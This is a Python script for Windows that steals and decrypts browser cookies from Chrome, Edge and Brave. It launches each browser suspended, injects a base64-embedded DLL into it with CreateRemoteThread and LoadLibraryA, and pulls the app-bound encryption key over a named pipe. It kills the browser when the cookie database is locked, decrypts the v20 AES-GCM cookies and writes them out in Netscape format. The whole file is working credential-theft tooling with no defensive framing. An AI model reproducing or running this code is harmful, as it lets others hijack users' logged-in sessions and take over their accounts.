import base64
import ctypes
import random
import re
import shutil
import sqlite3
import string

import psutil
import os
import tempfile
import winreg
import json

from ctypes import byref, wintypes, c_void_p, c_size_t, c_ulong, c_int, c_char_p, POINTER

import win32file
import win32pipe
from Crypto.Cipher import AES

localappdata = os.getenv('LOCALAPPDATA')

PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = 0x1F0FFF
VIRTUAL_MEM = 0x1000 | 0x2000

LPVOID = c_void_p
SIZE_T = c_size_t
DWORD = c_ulong
HANDLE = c_void_p
LPTHREAD_START_ROUTINE = LPVOID

V20_PREFIX = b"v20"
GCM_IV_LENGTH = 12
GCM_TAG_LENGTH = 16
COOKIE_PLAINTEXT_HEADER_SIZE = 32

WRAPPED_DLL = None


class BrowserConfig:
    name: str
    application: str
    data_path: str

    def __init__(self, name: str, application: str, data_path: str):
        self.name = name
        self.application = application
        self.data_path = data_path


BROWSER_CONFIG = [
    BrowserConfig(
        name="Chrome",
        application="chrome.exe",
        data_path=os.path.join(localappdata, r"Google\Chrome\User Data")
    ),
    BrowserConfig(
        name="Edge",
        application="msedge.exe",
        data_path=os.path.join(localappdata, r"Microsoft\Edge\User Data")
    ),
    BrowserConfig(
        name="Brave",
        application="brave.exe",
        data_path=os.path.join(localappdata, r"BraveSoftware\Brave-Browser\User Data")
    )
]

REGISTRY_PATHS = {
    "Hives": [
        winreg.HKEY_LOCAL_MACHINE,
        winreg.HKEY_CURRENT_USER
    ],
    "Subpaths":
    [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths"
    ]
}


def setup_kernel32() -> ctypes.WinDLL:
    kernel32 = ctypes.windll.kernel32
    kernel32.OpenProcess.argtypes = [DWORD, c_int, DWORD]
    kernel32.OpenProcess.restype = HANDLE

    kernel32.VirtualAllocEx.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, DWORD]
    kernel32.VirtualAllocEx.restype = LPVOID

    kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPVOID, SIZE_T, POINTER(SIZE_T)]
    kernel32.WriteProcessMemory.restype = c_int

    kernel32.GetModuleHandleA.argtypes = [c_char_p]
    kernel32.GetModuleHandleA.restype = HANDLE

    kernel32.GetProcAddress.argtypes = [HANDLE, c_char_p]
    kernel32.GetProcAddress.restype = LPVOID

    kernel32.CreateRemoteThread.argtypes = [
        HANDLE, LPVOID, SIZE_T,
        LPTHREAD_START_ROUTINE, LPVOID,
        DWORD, POINTER(DWORD)
    ]
    kernel32.CreateRemoteThread.restype = HANDLE

    return kernel32


kernel32 = setup_kernel32()

def get_encrypted_key_from_file(data_path: str) -> bytes:

    path = os.path.join(data_path, "Local State")
    with open(path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    b64_string = local_state['os_crypt']['app_bound_encrypted_key']
    decoded = base64.b64decode(b64_string)
    stripped = decoded[4:]
    return stripped


def setup_pipe(pipe_name: str) -> int:
    return win32pipe.CreateNamedPipe(
        pipe_name,
        win32pipe.PIPE_ACCESS_DUPLEX,
        win32pipe.PIPE_TYPE_BYTE |
        win32pipe.PIPE_READMODE_BYTE |
        win32pipe.PIPE_WAIT,
        1,
        65536,
        65536,
        0,
        None
    )


def get_install_path(executable_name: str) -> str | None:
    for hive in REGISTRY_PATHS["Hives"]:
        for subpath in REGISTRY_PATHS["Subpaths"]:
            try:
                with winreg.OpenKey(hive, subpath + "\\" + executable_name) as key:
                    install_path, _ = winreg.QueryValueEx(key, None)
                    return install_path
            except FileNotFoundError:
                continue
    return None


def launch_suspended_proc(app_path: str) -> tuple[int, wintypes.HANDLE]:

    CREATE_SUSPENDED = 0x00000004

    class STARTUPINFO(ctypes.Structure):
        _fields_ = [
            ("cb", wintypes.DWORD),
            ("lpReserved", wintypes.LPWSTR),
            ("lpDesktop", wintypes.LPWSTR),
            ("lpTitle", wintypes.LPWSTR),
            ("dwX", wintypes.DWORD),
            ("dwY", wintypes.DWORD),
            ("dwXSize", wintypes.DWORD),
            ("dwYSize", wintypes.DWORD),
            ("dwXCountChars", wintypes.DWORD),
            ("dwYCountChars", wintypes.DWORD),
            ("dwFillAttribute", wintypes.DWORD),
            ("dwFlags", wintypes.DWORD),
            ("wShowWindow", wintypes.WORD),
            ("cbReserved2", wintypes.WORD),
            ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
            ("hStdInput", wintypes.HANDLE),
            ("hStdOutput", wintypes.HANDLE),
            ("hStdError", wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", wintypes.HANDLE),
            ("hThread", wintypes.HANDLE),
            ("dwProcessId", wintypes.DWORD),
            ("dwThreadId", wintypes.DWORD),
        ]

    startup = STARTUPINFO()
    startup.cb = ctypes.sizeof(STARTUPINFO)
    proc_info = PROCESS_INFORMATION()

    ctypes.windll.kernel32.CreateProcessW(
        app_path,
        None,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(startup),
        ctypes.byref(proc_info)
    )

    return proc_info.dwProcessId, proc_info.hProcess


def inject_dll(dll_path: bytes, dll_len: int, process_handle: wintypes.HANDLE) -> None:
    arg_address = kernel32.VirtualAllocEx(process_handle, None, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

    written = SIZE_T(0)
    kernel32.WriteProcessMemory(process_handle, arg_address, dll_path, dll_len, byref(written))

    h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

    thread_id = DWORD(0)
    kernel32.CreateRemoteThread(
        process_handle, None, 0,
        h_loadlib, arg_address,
        0, byref(thread_id)
    )


def decrypt_key(pipe: int, encrypted_key: bytes) -> str:
    length_prefix = len(encrypted_key).to_bytes(4, byteorder='little', signed=False)
    win32pipe.ConnectNamedPipe(pipe, None)

    win32file.WriteFile(pipe, length_prefix + encrypted_key)
    result, data = win32file.ReadFile(pipe, 4096)
    return data.decode('ascii').strip()


def cleanup_process(process_handle: wintypes.HANDLE, pipe: int) -> None:
    kernel32.TerminateProcess(process_handle, 0)
    kernel32.CloseHandle(process_handle)
    win32file.CloseHandle(pipe)


def find_cookie_files(data_path: str) -> list[tuple[str, str]]:
    valid_profiles = []
    profile_folder_pattern = re.compile(r"^(Default|Profile\s+\d+)$", re.IGNORECASE)

    for entry in os.listdir(data_path):
        full_path = os.path.join(data_path, entry)
        if os.path.isdir(full_path) and profile_folder_pattern.match(entry):
            cookie_file = os.path.join(full_path, r"Network\Cookies")
            if os.path.exists(cookie_file):
                valid_profiles.append((cookie_file, entry))

    return valid_profiles


def decrypt_gcm(key: bytes, blob: bytes) -> bytes | None:
    if not blob.startswith(V20_PREFIX):
        return None

    prefix_len = len(V20_PREFIX)

    overhead = prefix_len + GCM_IV_LENGTH + GCM_TAG_LENGTH
    if len(blob) < overhead:
        return None

    iv = blob[prefix_len : prefix_len + GCM_IV_LENGTH]
    tag = blob[-GCM_TAG_LENGTH:]
    ciphertext = blob[prefix_len + GCM_IV_LENGTH : -GCM_TAG_LENGTH]

    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext


def decrypt_cookies(cookie_file: str, decrypted_key: bytes, taskname: str) -> list[str]:
    temp_dir = tempfile.mkdtemp()
    dst = os.path.join(temp_dir, "cookies_copy")
    try:
        shutil.copy2(cookie_file, dst)
    except:
        procs = [p for p in psutil.process_iter(['name']) if p.info['name'] and p.info['name'].lower() == taskname.lower()]
        for p in procs:
            try:
                p.kill()
            except psutil.NoSuchProcess:
                pass

        psutil.wait_procs(procs, timeout=5)
        shutil.copy2(cookie_file, dst)

    con = sqlite3.connect(dst)
    con.text_factory = bytes
    cur = con.cursor()
    cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
    cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
    rows = cur.fetchall()
    con.close()
    decrypted_cookies = []
    for host, name, enc_value in rows:
        host = host.decode("utf-8", errors="ignore")
        name = name.decode("utf-8", errors="ignore")
        if enc_value is None:
            continue

        plain = decrypt_gcm(decrypted_key, enc_value)
        if not plain or len(plain) <= COOKIE_PLAINTEXT_HEADER_SIZE:
            continue

        try:
            decoded_value = plain[COOKIE_PLAINTEXT_HEADER_SIZE:].decode("utf-8")
        except UnicodeDecodeError:
            continue

        decrypted_cookies.append(f"{host}\tTRUE\t/\tFALSE\t1893456000\t{name}\t{decoded_value}")

    return decrypted_cookies


def unwrap_dll(file_bytes: bytes) -> tuple[bytes, int]:
    temp_dir = tempfile.mkdtemp()
    filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16)) + ".dll"
    file_path = os.path.abspath(os.path.join(temp_dir, filename))
    with open(file_path, "wb") as f:
        f.write(file_bytes)
    encoded_path = file_path.encode("ascii")
    return encoded_path, len(encoded_path) + 1


def pid_to_tag(pid: int) -> str:

    def rotl32(x, r):
        return ((x << r) | (x >> (32 - r))) & 0xFFFFFFFF

    c1 = 0xA5A5A5A5
    c2 = 0x3C6EF372
    c3 = 0x1BF5A7E1
    c4 = 0x9E3779B9

    w1 = rotl32(pid ^ c1, 5)
    w2 = rotl32(pid ^ c2, 11)
    w3 = rotl32(pid ^ c3, 17)
    w4 = rotl32(pid ^ c4, 23)

    return f"{w1:08X}{w2:08X}{w3:08X}{w4:08X}"

if __name__ == "__main__":

    if not WRAPPED_DLL:
        print("Error: dll not found.")
        exit(1)

    for browser in BROWSER_CONFIG:

        browser_install_path = get_install_path(browser.application)

        if not browser_install_path:
            print(f"{browser.name} not found")
            continue

        print("-"*40)
        print(f"Getting key for {browser.name}...")

        pid, browser_process = launch_suspended_proc(browser_install_path)
        pipe_name = fr'\\.\pipe\{pid_to_tag(pid)}'

        pipe = setup_pipe(pipe_name)

        print("Opened pipe:", pipe_name)

        dll_path, dll_len = unwrap_dll(base64.b64decode(WRAPPED_DLL))

        inject_dll(dll_path, dll_len, browser_process)
        encrypted_app_bound_key = get_encrypted_key_from_file(browser.data_path)

        decrypted_key = bytes.fromhex(decrypt_key(pipe, encrypted_app_bound_key))
        cleanup_process(browser_process, pipe)

        print("Decrypted Key :", decrypted_key.hex())

        cookie_files = find_cookie_files(browser.data_path)
        os.makedirs("cookies", exist_ok=True)
        for cookie_file in cookie_files:
            dec_cookies = decrypt_cookies(cookie_file[0], decrypted_key, browser.application)
            if len(dec_cookies) > 0:
                with open(f"cookies\\{browser.name}_{cookie_file[1]}_cookies.txt", "w", encoding="utf-8") as f:
                    f.write("\n".join(dec_cookies))
                    print(f"Wrote {len(dec_cookies)} cookies to cookies\\{browser.name}_{cookie_file[1]}_cookies.txt")
